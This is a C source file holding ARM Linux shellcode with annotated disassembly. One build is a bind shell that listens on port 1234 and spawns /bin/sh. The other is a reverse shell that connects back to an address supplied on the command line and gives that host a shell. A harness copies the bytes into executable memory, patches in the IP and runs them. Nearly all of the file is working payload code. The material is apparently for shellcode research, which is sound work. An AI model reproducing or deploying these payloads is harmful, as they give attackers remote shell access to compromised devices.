/**
  Copyright © 2017 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

#include <sys/mman.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#ifndef CONNECT

// bind shell
#define CODE_SIZE 104

char CODE[] = {
  /* 0000 */ "\x54\x40\x9f\xe5" /* ldr      r4, [pc, #0x54] */
  /* 0004 */ "\x54\x50\x9f\xe5" /* ldr      r5, [pc, #0x54] */
  /* 0008 */ "\x54\x60\x9f\xe5" /* ldr      r6, [pc, #0x54] */
  /* 000C */ "\x01\x30\x8f\xe2" /* add      r3, pc, #1      */
  /* 0010 */ "\x13\xff\x2f\xe1" /* bx       r3              */
  /* 0014 */ "\x52\x40"         /* eors     r2, r2          */
  /* 0016 */ "\x01\x21"         /* movs     r1, #1          */
  /* 0018 */ "\x0f\x02"         /* lsls     r7, r1, #8      */
  /* 001A */ "\x19\x37"         /* adds     r7, #0x19       */
  /* 001C */ "\x02\x20"         /* movs     r0, #2          */
  /* 001E */ "\x01\xdf"         /* svc      #1              */
  /* 0020 */ "\x80\x46"         /* mov      r8, r0          */
  /* 0022 */ "\x21\x1c"         /* adds     r1, r4, #0      */
  /* 0024 */ "\x06\xb4"         /* push     {r1, r2}        */
  /* 0026 */ "\x69\x46"         /* mov      r1, sp          */
  /* 0028 */ "\x4a\x70"         /* strb     r2, [r1, #1]    */
  /* 002A */ "\x10\x22"         /* movs     r2, #0x10       */
  /* 002C */ "\x01\x37"         /* adds     r7, #1          */
  /* 002E */ "\x01\xdf"         /* svc      #1              */
  /* 0030 */ "\x01\x21"         /* movs     r1, #1          */
  /* 0032 */ "\x40\x46"         /* mov      r0, r8          */
  /* 0034 */ "\x02\x37"         /* adds     r7, #2          */
  /* 0036 */ "\x01\xdf"         /* svc      #1              */
  /* 0038 */ "\x52\x40"         /* eors     r2, r2          */
  /* 003A */ "\x49\x40"         /* eors     r1, r1          */
  /* 003C */ "\x40\x46"         /* mov      r0, r8          */
  /* 003E */ "\x01\x37"         /* adds     r7, #1          */
  /* 0040 */ "\x01\xdf"         /* svc      #1              */
  /* 0042 */ "\x80\x46"         /* mov      r8, r0          */
  /* 0044 */ "\x03\x21"         /* movs     r1, #3          */
  /* 0046 */ "\x3f\x27"         /* movs     r7, #0x3f       */
  /* 0048 */ "\x40\x46"         /* mov      r0, r8          */
  /* 004A */ "\x01\x39"         /* subs     r1, #1          */
  /* 004C */ "\x01\xdf"         /* svc      #1              */
  /* 004E */ "\xfa\xd1"         /* bne      #0x46           */
  /* 0050 */ "\x17\x1c"         /* adds     r7, r2, #0      */
  /* 0052 */ "\xe0\xb4"         /* push     {r5, r6, r7}    */
  /* 0054 */ "\x68\x46"         /* mov      r0, sp          */
  /* 0056 */ "\x0b\x27"         /* movs     r7, #0xb        */
  /* 0058 */ "\x01\xdf"         /* svc      #1              */
  /* 005A */ "\xc0\x46"         /* mov      r8, r8          */
  /* 005C */ "\x02\xff\x04\xd2" /* AF_INET, 1234            */
  /* 0060 */ "\x2f\x62\x69\x6e" /* /bin                     */
  /* 0064 */ "\x2f\x2f\x73\x68" /* //sh                     */
};

#else


char CODE[] = {
  /* 0000 */ "\x44\x30\x9f\xe5" /* ldr     r3, [pc, #0x44] */
  /* 0004 */ "\x44\x40\x9f\xe5" /* ldr     r4, [pc, #0x44] */
  /* 0008 */ "\x44\x50\x9f\xe5" /* ldr     r5, [pc, #0x44] */
  /* 000C */ "\x44\x60\x9f\xe5" /* ldr     r6, [pc, #0x44] */
  /* 0010 */ "\x01\x00\x8f\xe2" /* add     r0, pc, #1      */
  /* 0014 */ "\x10\xff\x2f\xe1" /* bx      r0              */
  /* 0018 */ "\x52\x40"         /* eors    r2, r2          */
  /* 001A */ "\x01\x21"         /* movs    r1, #1          */
  /* 001C */ "\x02\x20"         /* movs    r0, #2          */
  /* 001E */ "\x0f\x02"         /* lsls    r7, r1, #8      */
  /* 0020 */ "\x19\x37"         /* adds    r7, #0x19       */
  /* 0022 */ "\x01\xdf"         /* svc     #1              */
  /* 0024 */ "\x80\x46"         /* mov     r8, r0          */
  /* 0026 */ "\x18\xb4"         /* push    {r3, r4}        */
  /* 0028 */ "\x69\x46"         /* mov     r1, sp          */
  /* 002A */ "\x4a\x70"         /* strb    r2, [r1, #1]    */
  /* 002C */ "\x10\x22"         /* movs    r2, #0x10       */
  /* 002E */ "\x02\x37"         /* adds    r7, #2          */
  /* 0030 */ "\x01\xdf"         /* svc     #1              */
  /* 0032 */ "\x03\x21"         /* movs    r1, #3          */
  /* 0034 */ "\x3f\x27"         /* movs    r7, #0x3f       */
  /* 0036 */ "\x40\x46"         /* mov     r0, r8          */
  /* 0038 */ "\x01\x39"         /* subs    r1, #1          */
  /* 003A */ "\x01\xdf"         /* svc     #1              */
  /* 003C */ "\xfa\xd1"         /* bne     #0x34           */
  /* 003E */ "\x52\x40"         /* eors    r2, r2          */
  /* 0040 */ "\x17\x1c"         /* adds    r7, r2, #0      */
  /* 0042 */ "\xe0\xb4"         /* push    {r5, r6, r7}    */
  /* 0044 */ "\x68\x46"         /* mov     r0, sp          */
  /* 0046 */ "\x0b\x27"         /* movs    r7, #0xb        */
  /* 0048 */ "\x01\xdf"         /* svc     #1              */
  /* 004A */ "\xc0\x46"         /* mov     r8, r8          */
  /* 004C */ "\x02\xff\x04\xd2" /* AF_INET, 1234           */
  /* 0050 */ "\x7f\x00\x00\x01" /* 127.0.0.1               */
  /* 0054 */ "\x2f\x62\x69\x6e" /* /bin                    */
  /* 0058 */ "\x2f\x2f\x73\x68" /* //sh                    */
};

#define IP_ADDR_OFS 0x50

#endif

// allocate read/write and executable memory
// copy data from code and execute
void exec_code(void *code, size_t code_len, char *ip_str) {
  void     *bin;
  uint8_t  *p;
  in_addr_t ip;

  #ifdef CONNECT
  ip=inet_addr(ip_str);
  #endif

  bin=mmap (0, code_len,
    PROT_EXEC | PROT_WRITE | PROT_READ,
    MAP_ANON  | MAP_PRIVATE, -1, 0);

  if (bin!=NULL) {
    p=(uint8_t*)bin;

    memcpy (p, code, code_len);
    #ifdef CONNECT
      // copy ip
      memcpy ((void*)&p[IP_ADDR_OFS], (void*)&ip, sizeof(ip));
    #endif
    // execute
    ((void(*)())bin)();

    munmap (bin, code_len);
  }
}

int main(int argc, char *argv[]) {

    #ifdef CONNECT
      if(argc!=2){
        printf("usage: test <ip address>\n");
        return 0;
      }
    #endif

    exec_code(CODE, CODE_SIZE,argv[1]);

    return 0;
}